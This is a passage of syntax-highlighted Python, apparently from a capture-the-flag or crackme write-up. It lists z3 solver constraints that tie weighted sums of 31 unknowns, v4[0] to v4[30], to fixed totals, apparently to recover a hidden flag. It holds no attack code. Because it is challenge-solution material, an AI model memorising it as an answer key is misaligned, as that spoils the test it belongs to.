punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">357</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">389</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">81</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">529847</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">311</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">202</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">234</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">272</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">328</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">246</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">362</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">142</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">244</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">216</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">281</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">398</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">322</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">251</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">357</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">76</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">292</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">389</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">275</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">312</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">200</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">110</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">203</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">269</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">356</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">631652</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">261</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">189</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">202</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">185</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">182</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">285</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">217</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">157</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">232</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">132</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">169</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">154</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">121</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">389</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">376</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">292</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">225</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">155</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">234</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">149</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">241</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">312</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">368</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">129</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">226</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">288</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">201</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">288</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">614840</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">118</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">153</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">139</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">279</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">396</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">287</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">237</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">266</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">149</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">193</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">395</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">97</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">286</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">105</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">282</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">134</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">114</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">101</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">116</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">271</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">186</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">263</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">313</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">149</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">129</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">145</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">510398</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">385</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">112</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">232</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">145</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">313</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">156</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">321</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">358</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">382</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">144</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">222</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">329</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">161</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">335</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">50</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">373</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">292</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">310</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">154</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">396</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">81</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">355</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">558740</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">249</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">386</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">313</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">168</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">305</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">358</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">191</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">202</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">114</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">224</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">134</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">274</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">372</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">159</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">233</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">70</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">287</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">297</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">318</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">177</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">173</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">270</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">163</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">387</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">345</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">592365</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">392</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">385</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">302</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">343</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">324</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">223</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">372</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">261</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">181</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">203</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">232</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">305</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">393</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">325</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">231</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">142</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">264</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">300</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">387</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">360</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">225</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">127</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">80</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">268</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">619574</span><span class="token punctuation">)</span>
